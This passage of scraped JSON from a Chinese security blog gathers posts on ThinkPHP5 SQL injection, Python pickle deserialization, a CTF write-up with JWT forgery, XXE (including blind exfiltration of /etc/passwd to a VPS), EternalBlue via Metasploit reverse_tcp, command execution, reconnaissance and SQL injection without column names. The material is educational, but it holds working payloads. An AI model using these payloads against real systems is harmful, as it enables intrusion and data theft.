&#125;&#125;\n\n\n\n\n\n\n\\thinkphp\\application\\database.php数据库配置\n填写配置文件中，自己数据库的相关信息，即可。\n\n\\thinkphp\\application\\config.php调试模式配置\n// 应用调试模式&#x27;app_debug&#x27;              =&gt; true,// 应用Trace&#x27;app_trace&#x27;              =&gt; true,\n\n\n\n\n\n\n打入payload：http://localhost/thinkphp5/public/index.php/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1\n\n\n出现如图所示的页面，及漏洞环境配置成功\n漏洞分析\n在关键传参处设置断点，使用动态调试进行跟踪。\n我们知道 insert 方法存在漏洞，那就查看 insert 方法的具体实现。该方法位于 thinkphp\\library\\think\\db\\Builder.php 文件中，我们可以看到在函数开头调用了 parseData 方法，并将 $data 作为参数传入\n\n我们跟进 parseData 方法，该方法也在 thinkphp\\library\\think\\db\\Builder.php 文件中。可以看到，在结尾处有个switch语句，而且进入该语句后，会跳到case ‘inc’的地方，这里关键就是看看 $this-&gt;parseKey 是否有对 $val[1] 变量进行过滤了，因为 $val[1] 变量就是我们payload中的updatexml(1,concat(0x7,user(),0x7e),1) \n\n继续跟进parseKey，发现没有任何过滤\n\n观察最开始的insert方法\n\n不难发现，我们的payload第一处传参username[0]=inc 是为了跳转到switch语句中的case ‘inc’，\n然后username[1]注入我们完整的payload，利用报错信息携带出来，这里没有对我们的SQL语句进行过滤，最后的username[2]=1就是很简单的为了完整传递参数。\n至此，ThinkPHP5的SQL注入漏洞复现完毕。\n","categories":["漏洞复现"],"tags":["CVE-2018-16385"]},{"title":"浅析Python反序列化","url":"https://husins.cn/浅析Python反序列化/","content":"Pickle/CPickle反序列化漏洞Python反序列化漏洞出现在当反序列化的过程中出现__reduce()__这个魔法函数上，这一点和PHP中的__wakeup()魔术方法十分相似，都是在反序列化开始(或者结束)被自动调用。\n在反序列化的过程中，因为变成语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部吧解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞\n有一个好处pickle.loads会解决import问题，对于未引入的module会自动尝试import。也就是说整个Python标准库的代码执行、命令执行函数都可以使用。\n__reduce__:\n\n在python2中只有内置类才有__reduce__方法，即用class A(object)声明的类，而python3中已经默认都是内置类了\n#模仿Epicccal师傅的例子import pickleimport osclass Test2(object):    def __reduce__(self):    \t#被调用函数的参数        cmd = &quot;/usr/bin/id&quot;         return (os.system,(cmd,))if __name__ == &quot;__main__&quot;:    test = Test2()    #执行序列化操作    result1 = pickle.dumps(test)    #执行反序列化操作    result2 = pickle.loads(result1)# __reduce__()魔法方法的返回值:# return(os.system,(cmd,))# 1.满足返回一个元组，元组中有两个参数# 2.第一个参数是被调用函数 : os.system()# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd# 4. 因此序列化时被解析执行的代码是 os.system(&quot;/usr/bin/id&quot;)\n\n#os.system和os.popen os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0os.popen() 无法读取程序执行的返回值\n\n这两个函数只有以print输出时才会回显，如果是以return返回的就不会显示结果\n\n#参考可以使用的exp# coding=utf8import pickleimport urllibimport commandsclass payload(object):    def __reduce__(self):        return (commands.getoutput,(&#x27;ls /&#x27;,))a = payload()print urllib.quote(pickle.dumps(a))\n\n（水平不足，未完待续…）\n","categories":["漏洞总结"],"tags":["反序列化"]},{"title":"CISCN2019华北赛区_ikun","url":"https://husins.cn/CISCN2019华北赛区-ikun/","content":"打开题目，竟然是我最爱的坤坤！！！\n\n根据提示，一定要买到lv6\n翻了几页都没有lv6，写脚本自动化\nimport requestsurl = &quot;http://06d380da-b3e6-44d5-9b2a-07c1dc44bb70.node3.buuoj.cn/shop?page=&quot;for i in range(1,20000):    url = url + str(i)    resp = requests.get(url)    if &quot;lv6.png&quot; in resp.text:        print(i)        break\n\n\n找到lv6在181页\n\n\n在购买处发现，存在优惠卷，而且自己只有一千块根本买不起，想到可能是逻辑漏洞。\n\n这里也尝试修改price，但是一旦修改价格id就会发生变化，因此只能选择修改折扣\n\n\n跳转的新页面，只能够admin访问尝试获取admin，之前登陆注册时发现无法直接注册为admin，尝试抓包\n\n这里发现存在JWT，想到JWT伪造\n\n首先base64解码\n\n\n构造新的JWT还需要知道密钥，使用jwtcrack爆破\n./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ijc3NyJ9.Ftkg6Pg7x_Qc3CK5z6ul2u3kiPsQf_-ue9Lv47q4hA4\n\n\n使用脚本生成伪造JWT\n\n\nimport jwt# payloadtoken_dict = &#123;    &quot;username&quot;:&quot;admin&quot;&#125;#headersheaders = &#123;    &quot;alg&quot;:&quot;HS256&quot;,    &quot;typ&quot;:&quot;JWT&quot;&#125;# 调用jwt库,生成json web tokenjwt_token = jwt.encode(                       token_dict,  # payload                       &quot;1Kun&quot;,  # 进行加密签名的密钥                       algorithm=&quot;HS256&quot;,  # 指明签名算法方式,默认S256                       headers=headers  # headers                       ) print(jwt_token)\n\n\n\n上传新的JWT之后成功以admin登陆\n\n查看源码，发现提示下载备份文件（备份文件中不仅有解题的关键，还有高清无码的kunkun视频哟）\n在源码中，找到该页面对应的后端文件Admin.py\n\n发现该页面存在pickle.loads()这个函数，会造成Python反序列化命令执行\n因此构造恶意的__reduce__魔术方法，然后按照给的格式化payload\nimport pickleimport urllibclass test(object):    def __reduce__(self):         return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))c=pickle.dumps(test())d=urllib.quote(c)print d\n\n\n\n抓包给become传参，命令执行读取flag\n\n","categories":["CTF题解"],"tags":["JWT Pickle"]},{"title":"浅析XXE外部实体注入漏洞","url":"https://husins.cn/浅析XXE外部实体注入漏洞/","content":"XXE漏洞概述什么是XML可扩展性标记语言，是一种标记语言。主要用于：传送数据信息（即描述数据是什么，以及携带数据）。语言格式和HTML十分类似。\n举例如下：\n//便于理解&lt;?xml version=“1.0”?&gt; //XML声明 &lt;小纸条&gt; //文档元素     &lt;收件人&gt;王富贵&lt;/收件人&gt; //子结点     &lt;发件人&gt;李小花&lt;/发件人&gt;     &lt;主题&gt;问候&lt;/主题&gt;     &lt;具体内容&gt;今天学习了吗？&lt;/具体内容&gt; &lt;/小纸条&gt;//正式例子&lt;?xml version=“1.0”?&gt;                  //XML声明&lt;!DOCTYPE note [                       //文档类型定义（DTD)(内部定义)&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#) (#PCDATA)&gt; &lt;!ELEMENT from (#) (#PCDATA)&gt; &lt;!ELEMENT heading (#) (#PCDATA)&gt; &lt;!ELEMENT body (#) (#PCDATA)&gt; ]&gt;&lt;note&gt;                                //文档元素     &lt;to&gt;王富贵&lt;/to&gt; //子结点     &lt;from&gt;李小花&lt;/from&gt;     &lt;heading&gt;问候&lt;/heading&gt;     &lt;body&gt;今天学习了吗？&lt;/body&gt; &lt;/note&gt;\n\n什么是DTD？DTD（文档类型定义）的作用是定义XML文档的合法构建模块。它可以在XML文档内声明，也可以外部引用。\n外部定义： &lt;!DOCTYPE note SYSTEM “note.dtd”&gt; note.dtd 内容： &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#)\t(#PCDATA)&gt; &lt;!ELEMENT from (#)\t(#PCDATA)&gt; &lt;!ELEMENT heading (#)\t(#PCDATA)&gt; &lt;!ELEMENT body (#)\t(#PCDATA)&gt;\n\n当note.dtd可控的时候，就会产生XXE注入漏洞\n什么是XXE注入？XML 外部实体注入 / XXE (XML External Entity Injection) 漏洞发生在应用 程序解析 XML 输入时，没有禁止外部实体的加载。通过 XML 实体的 SYSTEM 关键词导致 XML 解析器可以从本地文件或者远程 URL 中读取数据。 所以攻击者可以通过 XML 实体传递自己构造的恶意值，使得处理程序解析 它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系 统命令、探测内网端口、攻击内网网站等危害。\n如何构造XXE实体注入\n//直接通过DTD外部实体声明:&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;root&gt;    &lt;name&gt;&amp;b;&lt;/name&gt; &lt;/root&gt;//通过DTD文档引入外部DTD文档，再引入外部实体声明:&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY % d SYSTEM &quot;http://192.168.xx.xx:8890/test.dtd&quot;&gt; %d; ]&gt;&lt;root&gt;    &lt;name&gt;&amp;b;&lt;/name&gt; &lt;/root&gt;test.dtd： &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;\n\n\n\nXXE漏洞探测技巧\n观察程序如何传输数据的，是否利用XML传输数据。\n\n尝试插入外部实体，观察回显。\n&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a[ &lt;!ENTITY b &quot;DASCTF&quot;&gt; ]&gt;&lt;root&gt; \t&lt;username&gt;&amp;b;&lt;/username&gt; \t&lt;password&gt;&amp;b;&lt;/password&gt; &lt;/root&gt;\n\n\n\n\n\n\n尝试插入外部地址的外部实体，观察是否有请求\n\nXXE漏洞利用方式一般XEE利用分两大情景： \n\n有回显：\n\n描述：可直接在页面中看到payload的执行结果。 \n\n思路：直接利用进行敏感文件获取等操作，直接输出结果。 \n\n在外部实体处利用PHP伪协议进行文件读取\n\n\n\n\n无回显（ blind xee ）： \n\n描述：看不到 payload 的执行结果。 \n\n思路：可通过外带使用外带数据通道提取数据，或者查看中间件日志。\n\n客户端发送payload 1给web服务器，\n\nweb服务器向vps获取恶意DTD，并执行文件读取payload2，\n\nweb服务器带着回显结果访问VPS上特定的FTP或者HTTP\n\n通过VPS获得回显（nc监听端口）\n//本地客户端&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://vps/test.xml&quot;&gt; %remote;]&gt;&lt;/pre&gt;//web服务器读取&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#x27;ftp://VPS:21/%payload;&#x27;&gt;&quot;&gt;%int;%trick;&lt;/pre&gt;\n\n\n\n\n\n\n\n\n\nXXE漏洞防御手段\n后端开发语言提供禁用外部实体的方法\n过滤用户提交的XML数据\n\n","categories":["漏洞总结"],"tags":["XXE"]},{"title":"永恒之蓝（ms17-010）","url":"https://husins.cn/永恒之蓝（ms17-010）/","content":"第一次复现漏洞，那必须是永恒之蓝！！！\n漏洞描述永恒之蓝，Eternalblue，漏洞编号：ms17-010,它是基于445端口和139端口针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码\n影响版本目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。\n复现环境\n\n\n\n系统\nIP地址\n\n\n\n攻击机\nKali Linux\n192.168.138.129\n\n\n目标机\nwindows 7 x64\n192.168.138.130\n\n\n复现过程\n信息收集\n\n确保攻击机能够正常访问靶机\n\n\nnmap探测目标机445端口是否开放\n\n\n​     命令：nmap -p 445 192.168.138.130\n​       \n\n\n\n使用MSF进行具体攻击\n\n打开MSF\n命令：msfconsole\n\n\n搜索ms17-010模块\n命令：search ms17-010\n\nauxiliary是辅助模块，检测是否存在该漏洞\nexploit是攻击模块，使用EXP对其进行攻击\n\n使用auxiliary对其进行检测\n\n经过探测，很有可能存在永恒之蓝漏洞\n\n使用exploit攻击模块\n在使用exploit模块时，要注意选择合适的版本，有的版本是适用于windows_8及其以上的\n\nset payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload\n\n\nshow options ：使用该命令会列出使用当前模块所需呀配置的参数\n\n\nset RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址\n\n\nset LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机\n\nset LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444\n\nrun：开始攻击\n一般来说出现很多[+]脚本基本执行成功\n\n\n\n验证脚本\n\n\n\n\n\n哈哈哈哈哈哈，复现的第一个漏洞，成功了心里有种说不出来的高兴！\n","categories":["漏洞复现"],"tags":["ms17-010"]},{"title":"浅析命令执行漏洞","url":"https://husins.cn/浅析命令执行漏洞/","content":"什么是命令执行漏洞命令执行漏洞（RCE):指的是攻击者可以直接在Web应用中执行系统命令，从而获取敏感信息或者拿下shell权限等，一系列危害系统安全的行为。\n命令执行漏洞形成的原因在编写Web端代码的时候，我们常常需要调用一些系统自带的命令，与计算机的底层进行交互。由此，很多脚本语言，设置了很多自带的函数，如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。\n命令执行漏洞的攻击流程当脚本语言存在可以执行系统命令的函数的地方，例如：\n\n此时即可利用这些函数执行系统操作，从而达到攻击的效果\n命令执行漏洞常用函数1. string system( string $command[, int &amp;$return_var] ) \n函数执行 command 参数所指定的命令，并且输出执行结果。 \n2. string exec( string $command[, array &amp;$output[, int &amp;$return_var]] ) \nexec() 执行 command 参数所指定的命令。 \n3. string shell_exec( string $cmd) \n通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。 \n4. void passthru( string $command[, int &amp;$return_var] ) \n执行外部程序并且显示原始输出。 \n5. 反引号\n例如ls，反引号的内容会被当做系统命令执行，其中内部就是执行了shell_exec()函数进行处理。\n6. void pcntl_exec( string $path[, array $args[, array $envs]] ) \npcntl是php的多进程处理扩展，在处理大量任务的情况下会使用到，pcntl需要额外安装。$path为可执行程序路径 (/bin/bash)。$args表示传递给$path程序的参数。 例如pcntl_exec(“/bin/bash” , array(“whoami”)); \n7. resource popen( string $command, string $mode) \n打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 例如popen(‘whoami &gt;&gt; 123.txt’, ‘r’); \n8. resource proc_open( string $cmd, array $descriptorspec, array &amp;$pipes[, string $cwd[, array $env[, array $other_options]]] ) \n执行一个命令，并且打开用来输入/输出的文件指针。类似 popen() 函数，但是 proc_open() 提供了更加强大的控制程序执行的能力\n命令执行漏洞的危害（只要是系统命令能够产生的操作）\n继承Web服务程序的权限去执行系统命令或读写文件\n反弹shell\n控制整个网站甚至控制服务器\n进一步内网渗透\n\n命令执行漏洞利用\n存在回显示的话，可以直接读取各种配置文件，密码文件，数据库连接文件等等\n遇到不回显的情况，最可靠的方法使用时间延迟推断，类似与盲注的方法。通过一些命令的延时作用来判断漏洞的存在，例如ping命令\n不能在浏览器直接看到回显，可将命令重定向到当前目录下的文件中并查看。或者用TFTP上传工具到服务器，用telnet和netcat建立反向shell，用mail通过SMTP发送结果给自己的计算机\n查看自己的权限，可以提升自己权限，访问敏感数据或控制服务器。\n文件写入，上传一句话木马，得到服务器权限\n\n命令执行利用的小技巧白盒测试\n可以代码审计的话,直接搜索含有常用的调用函数system、exec、shell_exec、passthru、pcntl_exec、popen、proc_open,以及反引号也可以执行命令。然后联系上下文看看有没有课控制的输入参数,可控制的点指的是,我们可以传入参数,如果在代码里写死了命令&lt;?php system(&quot;ipconfig&quot;):?&gt;就是无法利用的,针对可控制的参数,在进一步绕过过滤限制。\n黑盒测试\n黑盒挖掘任意命令执行漏洞要点在于找到可能调用第三方命令的业务场景，很多时候要半蒙半猜的去想后台代码是什么样的。通常在图片处理、大文件压缩、文件格式转化、日志处理以及数据库导出等功能比较容易调用一些小脚本进行辅助处理。能够确定某个业务模块使用到了第三方工具，就可以进一步对命令注入语句进行分析，是否存在各种限制，最常见的用各种fuzz推测后端对输入进行了哪些限制，对其进行相应的绕过。构造出可以利用的payload。\n命令执行防护的方法\n尽量少用执行命令的函数或者直接禁用\n参数值尽量使用引号包括\n在使用动态函数之前，确保使用的函数是指定的函数之一\n在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义\n能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在disable_functions中禁用\n对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤\n参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。\n\n","categories":["漏洞总结"],"tags":["RCE"]},{"title":"信息收集","url":"https://husins.cn/信息收集/","content":"信息收集域名的相关知识域名的技术指的是一个域名由多少级组成，域名的各个级别被“.”分开，简而言之，有多少个点就是几级域名顶级域名：.com(商)、.edu(教)、.gov(政)、.mil(军)一级域名：qq.com二级域名：ke.qq.com三级域名：zhz.ke,qq.com\nCDN什么是CDN？​        CDN就是内容分发网络，主要解决因传输距离和不同运营商借点造成的网络速度性能低下的问题。说简单点，就是在不同运营商之间的对接节点上的高速缓存服务器，把用户经常范文的静态数据资源（例如静态的html，CSS，js等文件。） 直接缓存在借点服务器上，当用户在其请求时，直接分发到在李用户进的借点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。     \nCDN对渗透测试的影响​        如果渗透目标购买了CDN服务，可以直接凭目标的域名，单但得到的并不是真正的Web服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我么你没法直接得到目标的真是IP段范围。\n判断目标是否使用了cdn​        可以进行全国多地区的ping服务  器操作，让后对比每个地区ping出的IP结果，查看这些ip是否一致，如果都是一样的，极有可能不存在CDN。如果IP太多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。\n​        在线工具：\n​                        https://www.17ce.com\n​                        http://ping.chinaz.com/\n如何绕过CDN？\n收到邮件，邮件发送的ip一般是真实ip  ，通过目标网站注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名ip。（这里必须是目标的邮件服务器，第三方或者公共邮件服务器是没有用的）\n\n扫描网站测试文件，如phpinfo，test等，从而找到目标的真是ip\n\n国外访问，一般国内网址，国外都不会挂在CDN。因此，通过国外在线代理网站APP Synthetic Monitor（https://asm.ca.com/en/ping.php）访问，可能会得到真实的ip    \n\n查询历史记录，查询未挂载CDN之前真实ip （https://www.netcraft.com）\n\n有的网站主站存在CDN，但是他的子站可能不存在，可能会出现子站和主站不在同一个IP但是在同一个C段下面的情况，从而能判断出目标的真实ip。\n\n如果目标站点有自己的APP，可以尝试使用burpsuit转包，从里面找到目标的真实IP\n\n绕过CloudFlare CDN查找真实IP。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站CloudFlareWatch对C;oudFlare客户网站进行真实ip查询。（https://ww.crimeflare.us/csf.html#box）\n备案信息查询ICP备案查询网：http://www.beibeian.com\n天眼查：http://www.tianyancha.com\n什么是whois​        whois指的是域名注册时留下的信息，比如管理员的名字，电话号码，邮箱\n为什么要收集whois？​        域名注册人可能就是网站管理员，可以尝试社工，套路，查询是不是注册了其他域名扩大攻击范围。 \n查询方式：​        百度whois，然后找到类似于站长之家的网站进行查询，一般外国网站更好用一点\n​        https://whois.aizhan.com\n​        http://whois.chainaz.com\n​        https://www.virustotal.com\n​        kail上自带whois查询\n子域名查询​        顶级域名下的二级域名或者三级升值更多级的域名都属于子域名，有一些直接ip访问的web站我们也归结于子域名收集范围\n为什么要收集子域名？​        有一些网站，主站没有什么功能或者防护过于严密，因此我们没有办法通过主站拿下相关数据，我们只能通过子域名的收集来来扩大我们的攻击范围。\n如何收集子域名？​        使用Google hacking 进行搜集。​        IP反查域名​        使用工具爆破DNS服务器（layer.exe 也叫子域名挖掘机）\n端口探测（Namp）为什么要探测端口？​        有些危险的端口开放了我们可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同的端口代表着不同的Web网站。很多时候不同端口对应着相应的服务，因此我们可以通过端口扫描来推测网站可能开启哪些服务。\n如何探测端口呢？​        利用工具namp，被称为扫描之王：使用方法如下：​        1、cmd-&gt;nmap 提示信息，表示打开成功。​        2、nmap 域名​        3、相关指令：​            -p 指定端口扫描 （-p 445 210.30.1.141） 这里建议全端口扫描的时候，可以使用-p 1-                65535 避免高端口不被扫描的情况发生。​            -v 查看他扫描的一些细节​            -Pn 会先ping一下 看机器是否存活，如果不存活不会扫描。​            -O 探测主机操作系统​            -A 全面扫描，简单说就是一起方法都用\n不同端口利用​                                                                                文件共享服务端口                                \n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n21/22/69\nFtp/Tftp文件传输协议\n如需匿名的上传、下载、爆破和嗅探操作\n\n\n2049\nNfs服务\n配置不当\n\n\n139\nSamba\n爆破、未授权访问、远程代码执行\n\n\n389\nLdap\n注入、与虚拟名访问、弱口令\n\n\n​                                                                                远程连接服务端口\n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n22\nSSh远程连接\n爆破、SSH隧道及内网代理转发、文件传输\n\n\n23\nTelnet远程连接\n爆破、嗅探、弱口令\n\n\n3389\nRdp远程连接桌面\nshift后门（需要Windows Server 2003 以下的系统）、爆破\n\n\n5900\nVNC\n弱口令爆破\n\n\n5632\nPyAnywhere\n抓密码、代码执行\n\n\n​                                                                            web应用服务端口\n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n80/443/8080\n常见的web服务端口\nWeb攻击、爆破、对应服务器版本漏洞\n\n\n7001/7002\nwebLogic控制台\nJava反序列化、弱口令\n\n\n8080/8089\nJboss/Resin/Jetty/Jenkins\n反序列化、控制台弱口令\n\n\n9090\nWebSphere控制台\nJava反序列化、弱口令\n\n\n4848\nGlassFish控制台\n弱口令\n\n\n1352\nLotus domino邮件服务\n弱口令、信息泄露、爆破\n\n\n10000\nWebmin-Web控制面板\n弱口令\n\n\n​                                                                      数据库服务端口\n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n3306\nMySQL\n注入、提前、爆破\n\n\n1433\nMSSQL\n注入、提权、SA弱口令、爆破\n\n\n1521\nOracle\nTNS爆破、注入、反弹shell\n\n\n5432\nPostgreSQL\n爆破、注入、弱口令\n\n\n27017/27018\nMongoDB\n爆破、未授权访问\n\n\n6379\nRedis数据库\n可尝试未授权访问、弱口令爆破\n\n\n5000\nSysBase/DB2数据库\n爆破、注入\n\n\n​                                                                    邮件服务端口\n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n25\nSMTP邮件服务\n邮件伪造\n\n\n110\nPOP3协议\n爆破、嗅探\n\n\n143\nIMAP协议\n爆破\n\n\n​                                                                        网络常见协议端口\n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n53\nDNS域名系统\n允许区域传送、DNS劫持、缓存投毒、欺骗\n\n\n67/68\nDHCP服务\n劫持、欺骗\n\n\n161\nSNMP协议\n爆破、搜集目标内网信息\n\n\n​                                                                      特殊服务端口\n\n\n\n端口号\n端口说明\n攻击方向\n\n\n\n2181\nZookeeper服务\n未授权访问\n\n\n8069\nZabbix服务\n远程执行、SQL注入\n\n\n9200/9300\nElasticsearch服务\n远程执行\n\n\n11211\nMemcache服务\n未授权访问\n\n\n512/513/514\nLinux Rexec服务\n爆破、Rlogin登陆\n\n\n873\nRsync服务\n匿名访问、文件上传\n\n\n3690\nSvn服务\nSvn泄露、未授权访问\n\n\n50000\nSAP Management Console\n远程执行\n\n\n目录扫描（御剑）什么是网站目录？​        在我们访问某个网站的时候其实就是在访问某一个文件夹里面存储的内容。\n为什么要目录扫描？​        通过不断重复的扫描，可能获得存有重要信息的目录，如后台登录地址等​    如何目录扫描？​        使用工具御剑，然后要记得不断地丰富自己的字典呦。\n指纹识别​        这里的指纹识别指的是网站CMS指纹识别、计算机操作系统及web容器的指纹识别，识别其特征安等等\n为什么要指纹识别？​        cms可能存在通杀漏洞，如果使用了cms建站我们可以用通杀漏洞直接攻击。或者来说读取很多这个web页面的相关信息\n如何指纹识别？​        http://whatweb.bugscaner.com/\n​        https://s.threatbook.cn/\n常见的cms​        Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、DVbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等\n旁站查询为什么要查询旁站？​        旁站值得是在同一个ip上面的多个网站，如果你成功拿下旁站，运气好和主站再同一台机器上，就有机会拿到主站，甚至尝试内网渗透。\n如何扫描旁站？​        1、在线工具\n​            http://stool.chinaz.com​            https://www.webscan.cc/\n​            https://phpinfo.me/domain（子域名爆破网站）\n​            https://dns.aizhan.com（IP反查绑定域名网站）\n​        2、搜素引擎枚举，如谷歌语法。\n​        3、第三方聚合应用枚举\n​                很多第三方DNS服务汇聚了大量DNS数据集，可通过他们检索摸个给定域名的子域名。如DNSdumpster(https://dnsdumpster.com/)、在线DNS侦查。\n​        4、证书透明度公开日志枚举\n​                证书透明度是证书授权机构（CA）的一个项目，证书授权机构与会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址。可以使用 https://crt.sh和https://censys.io来查询。\n​    \n\n\nC段扫描​    为什么要扫描c段？​        有些高校或者说大公司，他们会持有整个ip段，这个ip段中所有的ip都是那个公司的资产，拿下一台可能有有用信息，可能在同一内网。​    如何c段扫描？​        得到一个真实ip，然后自己进行推断。\n内容敏感信息泄露(gooole hacking)​    尝试谷歌语法，找到某些敏感内容，比如包含身份证号码的表格，包含服务器账号密码的文件，某些敏感文件，备份数据库等谷歌语法site：可以限制你搜索范围的域名.\ninurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.\nintext: 只搜索网页部分中包含的文字(也就是忽略了标题、URL等的文字)\nintitle: 查包含关键词的页面，一般用于社工别人的webshell密码\nfiletype：搜索文件的后缀或者扩展名\nintitle：限制你搜索的网页标题.\nlink: 可以得到一个所有包含了某个指定URL的页面列表.\n查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms\n查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username\n查找可注入点：site:域名 inurl:aspx|jsp|php|asp\n查找上传漏洞：site:域名 inurl:file|load|editor|Files\n找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit\n存在的数据库：site:域名 filetype:mdb|asp|#\n查看脚本类型：site:域名 filetype:asp/aspx/php/jsp\n迂回策略入侵：inurl:cms/data/templates/images/index/\n网络空间搜索引擎：1：www.zoomeye.org （钟馗之眼）2：www.shodan.io3:  https://fofa.so (fofa)\n\n","categories":["MISC"],"tags":["信息收集"]},{"title":"浅析无列名注入","url":"https://husins.cn/浅析无列名注入/","content":"什么是无列名注入在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql的sql注入中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是如information_schmea因为某些原因被严格的过滤，无法绕过的话。我们有可能需要通过无列名注入来获得数据信息。\n使用无列名注入的条件无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。\n无列名注入的原理无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。\n如何使用无列名注入当正常查询text表时\n\n当使用联合查询查询text表时\n\n这里我们会惊奇的发现，我们的列名被数字代替了，这是因为在进行联合查询的时候，我们会得到一个虚拟的表，数字相当于是对列名起的外号，这里的1就相当于之前的www 以此类推\n因此我们可以使用这种起外号的方法，在不知道列名的情况进行注入\n示例payload\nselect a.b from (select 1,2,3 as b union select * from admin) as a;select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3 #同时查询多个列\n\n参考链接：\nhttps://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/\nhttps://zhuanlan.zhihu.com/p/98206699\n","categories":["漏洞总结"],"tags":["SQL"]},{"title":"浅析无参数RCE","url":"https://husins.cn/浅析无参数RCE/","content":"什么是无参数RCEif(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])&#123;    eval($_GET[&#x27;exp&#x27;]);    &#125;\n\n如上，只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数。比如：\na();a(b());a(b(c()));\n\n无参数RCE中的正则正则可以分为三个部分：\n1.  `[a-z,_]+\\( 直到递归前面可以看作一个匹配整体，用来匹配所有小写字母下划线和左括号`\n2.  `(?R)? 递归部分看作一个匹配整体,效果是用来递归匹配`\n3.  `\\) 递归后面的看作一个匹配整体，用来匹配右括号`\na( //匹配上面第一个匹配整体，然后进入第一次递归    b( //匹配上面第一个匹配整体，进入第二次递归        c( //匹配上面第一个匹配整体，进入第三次递归            //没有匹配第一个匹配整体，递归停止        ) //匹配第二次递归剩下的表达式，即第三个匹配的整体\\),    )   //匹配第一次递归剩下的表达式，即\\),) //匹配原表达式剩下的表达式，即\\),\n\n*(?R)，(?R)?，(?R)，(?R)+的区别\n\n(?R) ， (?R)+ 这两个表达式是匹配不到东西的,因为每次匹配的时候都会至少运行一次递归，无法终止，所以匹配不到任何东西。 \n\n\n\n\n\n(?R)?,递归0次或1次，非贪婪，只能匹配a(b(c()))这种一层套一个函数的。\n\n\n\n\n\n(?R)*，递归0次或多次，贪婪，可以匹配a(b(c()d()))\n\n\n常用函数数组操作\narray_flip():\n\narray_rand:\n\narray_reverse:\n\n数组指针相关操作\n\ncurrent() - 